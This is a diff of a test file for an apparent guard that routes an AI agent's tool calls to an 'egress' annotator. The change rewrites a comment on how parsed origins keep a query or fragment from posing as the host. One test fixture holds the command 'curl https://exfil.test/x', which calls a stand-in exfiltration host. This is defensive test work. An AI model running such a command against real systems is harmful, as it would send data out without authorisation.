@@ -1433,10 +1433,12 @@ describe("a redaction lands on the argument the tool actually sent", () => {
 });
 
 describe("the annotator the shipped manifest declares", () => {
-  // The origin, not the matched text: the annotator hands the gate a parsed
-  // origin so that a userinfo, a query or a fragment cannot stand in for the
-  // host. This test is here to prove the routing, and it carries the
-  // destination shape too, so a change to either is visible in both suites.
+  // The origin, not the matched text: for an authority no parser could read
+  // two ways, the annotator hands the gate a parsed origin, so a query or a
+  // fragment cannot stand in for the host. Authorities that are not that
+  // unambiguous get a destination that cannot resolve instead -- see that
+  // module's own suite. This test is here to prove the routing, and it carries
+  // the destination shape too, so a change to either is visible in both suites.
   it("routes the egress annotator by name", () => {
     expect(
       dispatchGuardianAnnotator("egress", {}, { snapshot: { tool_call: { args: {}, raw_command: "curl https://exfil.test/x" } } }),
